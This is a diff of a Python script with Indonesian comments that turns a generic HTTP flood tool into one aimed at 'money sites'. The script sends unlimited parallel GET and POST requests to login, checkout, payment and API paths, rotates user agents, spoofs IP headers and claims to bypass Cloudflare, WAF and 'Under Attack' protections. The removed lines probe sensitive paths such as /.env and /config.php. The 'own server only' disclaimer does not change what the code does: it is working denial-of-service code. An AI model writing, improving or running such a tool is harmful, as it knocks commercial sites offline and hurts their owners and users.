@@ -1,15 +1,15 @@
 #!/usr/bin/env python3
 """
-⚠️ MULTI-PROTOCOL STRESS TEST TOOL ⚠️
+⚠️ MONEY SITE STRESS TEST TOOL ⚠️
 HANYA UNTUK TESTING SERVER YANG ANDA MILIKI!
 JANGAN GUNAKAN PADA WEBSITE ORANG LAIN!
 
 Fitur:
-- Kombinasi HTTP/1.1, HTTP/2, HTTP/3 (jika tersedia)
-- Unlimited requests, paralel
+- Kombinasi HTTP/1.1, HTTP/2 (dan HTTP/3 jika tersedia)
+- GET + POST ke path penting money site
 - Rotasi User-Agent, header, spoof IP
-- Bypass Cloudflare, WAF, Under Attack, Geo, Device
-- Real-time stats
+- Bypass Cloudflare, WAF, Under Attack
+- Statistik real-time, logging hasil
 - Tanpa batas waktu (Ctrl+C untuk stop)
 """
 
@@ -18,23 +18,29 @@ import httpx
 import time
 import random
 import threading
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from urllib.parse import urljoin, urlparse
+from concurrent.futures import ThreadPoolExecutor
+from urllib.parse import urljoin
 import argparse
 import sys
-import subprocess
-import platform
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Cek apakah aioquic tersedia untuk HTTP/3/QUIC
+# Cek HTTP/3 support
 try:
     import aioquic
     HTTP3_AVAILABLE = True
 except ImportError:
     HTTP3_AVAILABLE = False
 
-# User-Agents dan headers
+# Path penting money site
+MONEY_SITE_PATHS = [
+    '/', '/login', '/register', '/dashboard', '/profile', '/cart', '/checkout',
+    '/api/user', '/api/order', '/api/payment', '/api/product', '/api/search',
+    '/contact', '/about', '/help', '/faq', '/terms', '/privacy',
+    '/logout', '/settings', '/account', '/orders', '/wishlist', '/address',
+    '/reset-password', '/verify', '/notifications', '/messages', '/support',
+]
+
 USER_AGENTS = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
@@ -45,21 +51,25 @@ USER_AGENTS = [
     'python-requests/2.31.0',
 ]
 
-COMMON_PATHS = [
-    '/', '/admin', '/api', '/login', '/register', '/wp-admin', '/phpmyadmin', '/graphql', '/rest', '/test', '/dev', '/status', '/health', '/robots.txt', '/.env', '/config.php', '/sitemap.xml', '/debug', '/user', '/account', '/dashboard', '/upload', '/download', '/files', '/backup', '/logs', '/error', '/404', '/500', '/maintenance', '/core', '/system', '/tmp', '/cache', '/public', '/private', '/data', '/db', '/sql', '/setup', '/install', '/init', '/start', '/stop', '/shutdown', '/restart', '/ping', '/pong', '/echo', '/info', '/about', '/contact', '/help', '/support', '/docs', '/doc', '/documentation', '/readme', '/sample', '/example', '/test123', '/random', '/beta', '/alpha', '/staging', '/prod', '/v1', '/v2', '/v3', '/v4', '/v5', '/api/v1', '/api/v2', '/api/v3', '/api/v4', '/api/v5', '/api/users', '/api/data', '/api/info', '/api/config', '/api/status', '/api/health', '/api/login', '/api/register', '/api/auth', '/api/token', '/api/session', '/api/logout', '/api/upload', '/api/download', '/api/files', '/api/backup', '/api/logs', '/api/error', '/api/404', '/api/500', '/api/maintenance', '/api/core', '/api/system', '/api/tmp', '/api/cache', '/api/public', '/api/private', '/api/db', '/api/sql', '/api/setup', '/api/install', '/api/init', '/api/start', '/api/stop', '/api/shutdown', '/api/restart', '/api/ping', '/api/pong', '/api/echo', '/api/info', '/api/about', '/api/contact', '/api/help', '/api/support', '/api/docs', '/api/doc', '/api/documentation', '/api/readme', '/api/sample', '/api/example', '/api/test123', '/api/random', '/api/beta', '/api/alpha', '/api/staging', '/api/prod',
-]
-
-# Kombinasi protokol yang akan digunakan
 PROTOCOLS = ['http1', 'http2']
 if HTTP3_AVAILABLE:
     PROTOCOLS.append('http3')
 
-# Fungsi untuk spoof IP
+# Data POST dummy untuk simulasi login/register
+POST_DATA = {
+    '/login': {'username': 'testuser', 'password': 'testpass'},
+    '/register': {'username': 'testuser', 'email': 'test@mail.com', 'password': 'testpass'},
+    '/checkout': {'cart_id': '12345', 'payment_method': 'credit_card'},
+    '/api/login': {'username': 'testuser', 'password': 'testpass'},
+    '/api/register': {'username': 'testuser', 'email': 'test@mail.com', 'password': 'testpass'},
+    '/api/order': {'product_id': '1', 'qty': 1, 'address': 'test address'},
+    '/api/payment': {'order_id': '1', 'method': 'credit_card'},
+}
+
 def random_ip():
     return f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
 
-# Fungsi utama untuk satu request
-def stress_request(url, path, protocol):
+def stress_request(url, path, protocol, method):
     full_url = urljoin(url, path)
     headers = {
         'User-Agent': random.choice(USER_AGENTS),
@@ -79,27 +89,33 @@ def stress_request(url, path, protocol):
     }
     try:
         if protocol == 'http1':
-            resp = requests.get(full_url, headers=headers, timeout=10, allow_redirects=True, verify=False)
+            if method == 'GET':
+                resp = requests.get(full_url, headers=headers, timeout=10, allow_redirects=True, verify=False)
+            else:
+                data = POST_DATA.get(path, {'test': 'data'})
+                resp = requests.post(full_url, headers=headers, data=data, timeout=10, allow_redirects=True, verify=False)
             return resp.status_code, len(resp.content)
         elif protocol == 'http2':
             with httpx.Client(http2=True, verify=False, timeout=10) as client:
-                resp = client.get(full_url, headers=headers)
+                if method == 'GET':
+                    resp = client.get(full_url, headers=headers)
+                else:
+                    data = POST_DATA.get(path, {'test': 'data'})
+                    resp = client.post(full_url, headers=headers, data=data)
                 return resp.status_code, len(resp.content)
         elif protocol == 'http3' and HTTP3_AVAILABLE:
-            # Gunakan aioquic client (jika tersedia)
-            # Atau gunakan tool eksternal seperti curl/h3 atau quic-client
-            # Di sini hanya placeholder, implementasi HTTP/3 real perlu setup lebih lanjut
-            return 0, 0  # Placeholder
+            # Placeholder HTTP/3
+            return 0, 0
         else:
             return 0, 0
     except Exception as e:
         return -1, 0
 
-# Worker function
 def worker(url, protocol, stop_event, stats):
     while not stop_event.is_set():
-        path = random.choice(COMMON_PATHS)
-        status, size = stress_request(url, path, protocol)
+        path = random.choice(MONEY_SITE_PATHS)
+        method = random.choice(['GET', 'POST']) if path in POST_DATA else 'GET'
+        status, size = stress_request(url, path, protocol, method)
         stats['total'] += 1
         if status == 200:
             stats['success'] += 1
@@ -108,9 +124,8 @@ def worker(url, protocol, stop_event, stats):
         if stats['total'] % 10 == 0:
             print(f"[{protocol.upper()}] Total: {stats['total']} | Success: {stats['success']} | Fail: {stats['fail']}")
 
-# Main function
 def main():
-    parser = argparse.ArgumentParser(description='⚠️ MULTI-PROTOCOL STRESS TEST TOOL ⚠️')
+    parser = argparse.ArgumentParser(description='⚠️ MONEY SITE STRESS TEST TOOL ⚠️')
     parser.add_argument('url', help='Target URL (HANYA SERVER YANG ANDA MILIKI!)')
     parser.add_argument('--workers', type=int, default=20, help='Number of workers per protocol (default: 20)')
     parser.add_argument('--confirm', action='store_true', help='Confirm that you own this server')
@@ -133,7 +148,7 @@ def main():
     if not args.url.startswith(('http://', 'https://')):
         args.url = 'https://' + args.url
 
-    print(f"🚀 Memulai MULTI-PROTOCOL STRESS TEST pada: {args.url}")
+    print(f"🚀 Memulai MONEY SITE STRESS TEST pada: {args.url}")
     print(f"⚡ Workers per protocol: {args.workers}")
     print(f"🌐 Protocols: {', '.join(PROTOCOLS)}")
     print(f"⏰ Tanpa batas waktu - Tekan Ctrl+C untuk stop")
